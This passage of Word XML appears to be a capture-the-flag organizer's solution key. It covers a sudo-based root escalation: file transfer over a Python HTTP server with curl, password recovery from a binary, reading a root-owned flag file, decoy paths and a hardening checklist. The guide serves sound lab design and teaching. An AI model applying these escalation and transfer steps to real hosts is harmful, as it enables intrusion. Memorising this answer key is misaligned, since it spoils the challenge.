      </w:pPr>
      <w:r>
        <w:t>Output shows exactly one allowed command:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>(root) NOPASSWD: /home/Agent999/.system-audit/.beroot ""</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This is also how the hidden </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.system-audit/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> directory is discovered — it was never listed by a normal </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ls</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in the home directory.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Transfer for analysis</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (the intended technique is a Python HTTP server, never stated outright to players). Port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1337</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is the only transfer port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ufw</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> allows inbound - see </w:t>
      </w:r>
      <w:hyperlink r:id="rId10">
        <w:r>
          <w:rPr>
            <w:color w:val="1F5C99"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>NETWORK_GUIDE.md</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t># on the target, as Agent999:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>cd ~/.system-audit &amp;&amp; python3 -m http.server 1337</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:t># on the attacker box:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>curl -O http://&lt;IP&gt;:1337/.beroot</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Reverse engineering</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Open </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.beroot</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in Ghidra, decompile </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>main</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. It's a single </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>strcmp()</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> against a hardcoded string — recoverable via Ghidra's decompiler or just </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>strings .beroot | less</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Root transition</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:t>sudo /home/Agent999/.system-audit/.beroot</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>Password: &lt;recovered password&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>whoami   # root</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>cat /root/.sysconfig_cache</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>echo '&lt;base64&gt;' | base64 -d</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Why the sudo rule can't be abused for more than this</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: the rule names the exact absolute path to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.beroot</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and pins its argument list to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>""</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (no arguments). sudoers gives free rein over arguments when a command is listed without any — the explicit empty-argument spec is what prevents </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>sudo /home/Agent999/.system-audit/.beroot -c "some other command"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or similar from ever reaching sudo's parser as a valid invocation.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Encoding</w:t>
      </w:r>
      <w:r>
        <w:t>: Base64.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Decoding</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>echo '&lt;base64&gt;' | base64 -d</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Flag</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: see </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>FLAG5</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>secrets.env</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="B8AFA0"/>
        </w:pBdr>
        <w:spacing w:after="280"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Rabbit holes (do not reveal to players)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Rabbit hole 1 — Decoy backup directory</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/var/backups/website-backup-2021/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — an old static export of the marketing site (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>index.html.bak</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>old_notes.txt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) with genuinely irrelevant content. Deliberately sits alongside the real </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/var/backups/legacy-ops/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> so that a plain </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>find /var/backups -type d</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> surfaces both and the player has to actually read the contents to tell them apart. No flag, no credentials, no path forward.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Rabbit hole 2 — Fake admin login</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>http://&lt;IP&gt;/admin/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — a static "Staff Portal" login form. It is listed in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>robots.txt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> alongside the real hidden path specifically so it reads as equally interesting. The form has no backend at all; every submission is rejected client-side by a few lines of JavaScript. There is no injection, no bypass, and nothing to find in the page source beyond that.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Rabbit hole 3 — Decoy SUID binary</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/usr/local/bin/sysdiag</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — genuinely installed SUID-root (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>chmod 4755</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">), so </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>find / -perm -4000 2&gt;/dev/null</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will flag it as interesting. It only calls </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>uname()</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>statvfs()</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and prints fixed diagnostic text; it never shells out, never trusts an environment variable or relative path, and takes no input at all. There is no GTFOBins-style technique that turns this into a shell — it is a dead end by design.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="B8AFA0"/>
        </w:pBdr>
        <w:spacing w:after="280"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Anti-shortcut checklist</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Confirm all of these after every install (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>tests/test_permissions.sh</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> automates most of it):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sudo -l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Agent99</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> shows no usable rule (in fact, no sudo entry at all for that user).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Agent99</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> cannot read </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/home/Agent999</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/root</w:t>
      </w:r>
      <w:r>
        <w:t>.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Agent999</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">'s only sudo rule is the exact </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.beroot</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> path with no arguments — never </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ALL</w:t>
      </w:r>
      <w:r>
        <w:t>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7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.beroot</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> password appears nowhere under </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/home/Agent999</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in plaintext (not in history, not in a stray file).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grep -RIsE "CTF\{[0-9a-f]{32}\}" /</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (excluding </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/proc</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/sys</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/opt/ctf/.organizer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) turns up nothing — every on-disk flag representation is base64, never the raw </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="7A1F2B"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>CTF{...}</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> string.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A1F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7A1F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227"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:color w:val="1B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NETWORK_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